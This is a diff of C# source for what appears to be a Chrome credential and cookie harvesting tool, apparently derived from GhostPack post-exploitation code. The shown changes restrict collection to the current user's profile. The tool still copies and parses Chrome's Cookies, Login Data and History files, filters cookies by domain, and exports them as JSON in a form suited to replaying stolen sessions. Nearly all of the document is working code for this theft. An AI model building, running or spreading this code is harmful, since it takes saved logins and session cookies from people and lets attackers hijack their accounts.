@@ -127,152 +127,71 @@ Arguments:
             // Main loop, path parsing and high integrity check taken from GhostPack/SeatBelt
             try
             {
-                if (IsHighIntegrity())
+                
+                string userChromeHistoryPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                string userChromeBookmarkPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                string userChromeCookiesPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                string userChromeLoginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                string[] chromePaths = { userChromeHistoryPath, userChromeBookmarkPath, userChromeCookiesPath, userChromeLoginDataPath };
+                if (ChromeExists(chromePaths))
                 {
-                    Console.WriteLine("\r\n\r\n=== Chrome (All Users) ===");
-
-                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
-                    string[] dirs = Directory.GetDirectories(userFolder);
-                    foreach (string dir in dirs)
+                    Console.WriteLine("\r\n\r\n=== Chrome (Current User) ===");
+                    if (useTmpFile)
                     {
-                        string[] parts = dir.Split('\\');
-                        string userName = parts[parts.Length - 1];
-                        string userChromeHistoryPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", dir);
-                        string userChromeBookmarkPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks", dir);
-                        string userChromeLoginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", dir);
-                        string userChromeCookiesPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", dir);
-                        string[] chromePaths = { userChromeHistoryPath, userChromeBookmarkPath, userChromeLoginDataPath, userChromeCookiesPath };
-                        if (ChromeExists(chromePaths))
+                        if (getCookies)
                         {
-                            // History parse
-                            if (useTmpFile)
+                            string tmpUserChromeCookiesPath = CreateTempFile(userChromeCookiesPath);
+                            if (domainArray.Length > 0)
                             {
-                                if (getCookies)
-                                {
-                                    string tmpUserChromeCookiesPath = CreateTempFile(userChromeCookiesPath);
-                                    if (domainArray.Length > 0)
-                                    {
-                                        HostCookies[] cookies = ParseChromeCookies(tmpUserChromeCookiesPath, userName, true, domainArray);
-                                    }
-                                    else
-                                    {
-                                        HostCookies[] cookies = ParseChromeCookies(tmpUserChromeCookiesPath, userName, true);
-                                    }
-                                    File.Delete(tmpUserChromeCookiesPath);
-                                }
-
-                                if (getHistory)
-                                {
-                                    string tmpUserChromeCookiesPath = CreateTempFile(userChromeCookiesPath);
-                                    HostCookies[] cookies = ParseChromeCookies(tmpUserChromeCookiesPath, userName);
-                                    File.Delete(tmpUserChromeCookiesPath);
-                                    userChromeHistoryPath = CreateTempFile(userChromeHistoryPath);
-                                    ParseChromeHistory(userChromeHistoryPath, userName, cookies);
-                                    File.Delete(userChromeHistoryPath);
-                                }
-
-                                if (getLogins)
-                                {
-                                    userChromeLoginDataPath = CreateTempFile(userChromeLoginDataPath);
-                                    ParseChromeLogins(userChromeLoginDataPath, userName);
-                                    File.Delete(userChromeLoginDataPath);
-                                }
+                                ParseChromeCookies(tmpUserChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"), true, domainArray);
                             }
                             else
                             {
-                                if (getCookies)
-                                {
-                                    if (domainArray.Length > 0)
-                                    {
-                                        ParseChromeCookies(userChromeCookiesPath, userName, true, domainArray);
-                                    }
-                                    else
-                                    {
-                                        ParseChromeCookies(userChromeCookiesPath, userName, true);
-                                    }
-                                }
-
-                                if (getHistory)
-                                {
-                                    HostCookies[] cookies = ParseChromeCookies(userChromeCookiesPath, userName);
-                                    ParseChromeHistory(userChromeHistoryPath, userName, cookies);
-                                }
-
-                                if (getLogins)
-                                {
-                                    ParseChromeLogins(userChromeLoginDataPath, userName);
-                                }
+                                ParseChromeCookies(tmpUserChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"), true);
                             }
+                            File.Delete(tmpUserChromeCookiesPath);
+                        }
+
+                        if (getHistory)
+                        {
+                            string tmpUserChromeCookiesPath = CreateTempFile(userChromeCookiesPath);
+                            HostCookies[] cookies = ParseChromeCookies(tmpUserChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"));
+                            File.Delete(tmpUserChromeCookiesPath);
+                            userChromeHistoryPath = CreateTempFile(userChromeHistoryPath);
+                            ParseChromeHistory(userChromeHistoryPath, System.Environment.GetEnvironmentVariable("USERNAME"), cookies);
+                            File.Delete(userChromeHistoryPath);
+                        }
+
+                        if (getLogins)
+                        {
+                            userChromeLoginDataPath = CreateTempFile(userChromeLoginDataPath);
+                            ParseChromeLogins(userChromeLoginDataPath, System.Environment.GetEnvironmentVariable("USERNAME"));
+                            File.Delete(userChromeLoginDataPath);
                         }
                     }
-                }
-                else
-                {
-                    string userChromeHistoryPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", System.Environment.GetEnvironmentVariable("USERPROFILE"));
-                    string userChromeBookmarkPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks", System.Environment.GetEnvironmentVariable("USERPROFILE"));
-                    string userChromeCookiesPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", System.Environment.GetEnvironmentVariable("USERPROFILE"));
-                    string userChromeLoginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", System.Environment.GetEnvironmentVariable("USERPROFILE"));
-                    string[] chromePaths = { userChromeHistoryPath, userChromeBookmarkPath, userChromeCookiesPath, userChromeLoginDataPath };
-                    if (ChromeExists(chromePaths))
+                    else
                     {
-                        Console.WriteLine("\r\n\r\n=== Chrome (Current User) ===");
-                        if (useTmpFile)
+                        if (getCookies)
                         {
-                            if (getCookies)
+                            if (domainArray.Length > 0)
                             {
-                                string tmpUserChromeCookiesPath = CreateTempFile(userChromeCookiesPath);
-                                if (domainArray.Length > 0)
-                                {
-                                    ParseChromeCookies(tmpUserChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"), true, domainArray);
-                                }
-                                else
-                                {
-                                    ParseChromeCookies(tmpUserChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"), true);
-                                }
-                                File.Delete(tmpUserChromeCookiesPath);
+                                ParseChromeCookies(userChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"), true, domainArray);
                             }
-
-                            if (getHistory)
+                            else
                             {
-                                string tmpUserChromeCookiesPath = CreateTempFile(userChromeCookiesPath);
-                                HostCookies[] cookies = ParseChromeCookies(tmpUserChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"));
-                                File.Delete(tmpUserChromeCookiesPath);
-                                userChromeHistoryPath = CreateTempFile(userChromeHistoryPath);
-                                ParseChromeHistory(userChromeHistoryPath, System.Environment.GetEnvironmentVariable("USERNAME"), cookies);
-                                File.Delete(userChromeHistoryPath);
-                            }
-
-                            if (getLogins)
-                            {
-                                userChromeLoginDataPath = CreateTempFile(userChromeLoginDataPath);
-                                ParseChromeLogins(userChromeLoginDataPath, System.Environment.GetEnvironmentVariable("USERNAME"));
-                                File.Delete(userChromeLoginDataPath);
+                                ParseChromeCookies(userChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"), true);
                             }
                         }
-                        else
+
+                        if (getHistory)
                         {
-                            if (getCookies)
-                            {
-                                if (domainArray.Length > 0)
-                                {
-                                    ParseChromeCookies(userChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"), true, domainArray);
-                                }
-                                else
-                                {
-                                    ParseChromeCookies(userChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"), true);
-                                }
-                            }
+                            HostCookies[] cookies = ParseChromeCookies(userChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"));
+                            ParseChromeHistory(userChromeHistoryPath, System.Environment.GetEnvironmentVariable("USERNAME"), cookies);
+                        }
 
-                            if (getHistory)
-                            {
-                                HostCookies[] cookies = ParseChromeCookies(userChromeCookiesPath, System.Environment.GetEnvironmentVariable("USERNAME"));
-                                ParseChromeHistory(userChromeHistoryPath, System.Environment.GetEnvironmentVariable("USERNAME"), cookies);
-                            }
-
-                            if (getLogins)
-                            {
-                                ParseChromeLogins(userChromeLoginDataPath, System.Environment.GetEnvironmentVariable("USERNAME"));
-                            }
+                        if (getLogins)
+                        {
+                            ParseChromeLogins(userChromeLoginDataPath, System.Environment.GetEnvironmentVariable("USERNAME"));
                         }
                     }
                 }
@@ -313,7 +232,7 @@ Arguments:
             private bool _httpOnly;
             private string _name;
             private string _path;
-            private string _sameSite;
+            //private string _sameSite;
             private bool _secure;
             private bool _session;
             private string _storeId;
@@ -351,11 +270,11 @@ Arguments:
                 get { return _path; }
                 set { _path = value; }
             }
-            public string SameSite
-            {
-                get { return _sameSite; }
-                set { _sameSite = value; }
-            }
+            //public string SameSite
+            //{
+            //    get { return _sameSite; }
+            //    set { _sameSite = value; }
+            //}
             public bool Secure
             {
                 get { return _secure; }
@@ -391,6 +310,10 @@ Arguments:
                 {
                     PropertyInfo property = properties[i];
                     object[] keyvalues = { property.Name[0].ToString().ToLower() + property.Name.Substring(1, property.Name.Length - 1), property.GetValue(this, null) };
+                    if (keyvalues[1].ToString().Contains("\""))
+                    {
+                        keyvalues[1] = keyvalues[1].ToString().Replace("\"", "\\\"");
+                    }
                     string jsonString = "";
                     if (keyvalues[1].GetType() == typeof(String))
                     {
@@ -437,7 +360,7 @@ Arguments:
                     this.Cookies[i].Id = i + 1;
                     jsonCookies[i] = this.Cookies[i].ToJSON();
                 }
-                return "[" + String.Join(",", jsonCookies) + "]";
+                return "{\"cookies\": [" + String.Join(",", jsonCookies) + "]}";
             }
         }
 
@@ -478,7 +401,7 @@ Arguments:
                 }
                 cookie.Name = row["name"].ToString();
                 cookie.Path = row["path"].ToString();
-                cookie.SameSite = "no_restriction"; // Not sure if this is the same as firstpartyonly
+                // cookie.SameSite = "no_restriction"; // Not sure if this is the same as firstpartyonly
                 if (row["is_secure"].ToString() == "1")
                 {
                     cookie.Secure = true;
@@ -535,7 +458,7 @@ Arguments:
                 foreach (HostCookies hostInstance in hostCookies)
                 {
                     // Determine if the hostname matches the subdomain perm
-                    if (hostInstance.HostName == sub)
+                    if (hostInstance.HostName.ToLower().Contains(sub.ToLower()))
                     {
                         // If it does, cycle through
                         foreach (Cookie cookieInstance in hostInstance.Cookies)
